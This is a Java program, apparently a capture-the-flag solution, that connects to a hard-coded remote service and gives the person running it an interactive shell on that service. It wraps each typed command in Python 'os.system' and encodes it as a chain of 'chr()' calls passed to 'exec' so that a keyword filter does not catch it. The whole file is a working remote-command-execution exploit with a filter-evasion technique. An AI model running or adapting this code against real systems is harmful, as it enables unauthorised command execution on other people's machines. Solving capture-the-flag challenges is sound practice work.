package ru.serega6531;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.stream.Collectors;

public class Main {

    private static String bypassFilter(String command) {
        return "exec(" +
                command.chars()
                        .mapToObj(c -> "chr(" + (c) + ")")
                        .collect(Collectors.joining("+"))
                + ")";
    }

    public static void main(String[] args) throws IOException {
        Socket socket = new Socket("45.76.90.207", 14000);
        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());

        BufferedReader commandReader = new BufferedReader(new InputStreamReader(System.in));

        System.out.println(reader.readLine());
        for (int i = 0; i < 5; i++) {
            writer.write("1\n");
            writer.flush();
            System.out.println(reader.readLine());
        }
        while (true) {
            reader.skip("<You>: ".length());
            final String command = "import os; os.system('" + commandReader.readLine() + "')";
            System.out.println(command);
            String filtered = bypassFilter(command);
            System.out.println("> " + filtered);
            writer.write(filtered + '\n');
            writer.flush();
            System.out.println(reader.readLine());
        }
    }
}
